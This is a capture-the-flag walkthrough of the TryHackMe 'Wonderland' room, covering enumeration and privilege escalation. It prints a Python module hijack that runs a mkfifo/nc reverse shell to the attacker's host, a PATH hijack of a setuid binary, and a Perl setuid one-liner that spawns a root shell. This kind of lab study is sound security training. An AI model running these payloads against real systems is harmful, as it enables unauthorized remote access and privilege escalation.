# Wonderland

[Wonderland](https://tryhackme.com/room/wonderland)

## Solution

- nmap scan 22, 80

- dirb scan img, r

also tried feroxbuster and it detected also the entire dir tree.

I tried to go to /r/a/b/b/i/t one by one and it showed some text on the pages.
On the last page we can inspect the source and see the following
`alice:HowDothTheLittleCrocodileImproveHisShiningTail`. This is the login for
ssh into the box.

We can run `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as
rabbit. The python script imports random and uses choice. Something new I
learned `python path hijack`. We can create a file called `random.py` in the
current directory and define the choice function to do something shaddy.

```
import os

def choice(a):
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc `ip` `port`>/tmp/f")
```

Open a nc listener on the host machine on port `port` and then run the script.
Then we run `sudo -u rabbit /usr/bin/python3.6
/home/alice/walrus_and_the_carpenter.py` To run the command as rabbit. And now
we should have a shell with the user rabbit.

In the home directory of rabbit we can find an executable that does something.
I don't know how to do this cleanly, but we can copy the teaParty executable to
alice and then use scp to get it on the host machine. (I did something like
`cat teaParty > /tmp/teaParty` and then from alice I copied it to home, and
then did `scp alice@<ip>:teaParty .` on the host). Then we can use strings on
the file and check for interesting stuff. We can also gdb/dissasemble it. We
can see that it executes the date command, so as with the python code we can
overwrite it. It also does setuid 1003 which means that it runs it as the
Hatter user. After we run `./teaParty` we will be logged in as hatter. In his
home we can find the password file `WhyIsARavenLikeAWritingDesk?`.

I ran linpeas and found that `perl` has setuid capabilities. So we can try one
exploit. `/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec
"/bin/sh";'` Next we can go to the alice home and print the root.txt file.
Finally we can go to the root home and find the user.txt file.
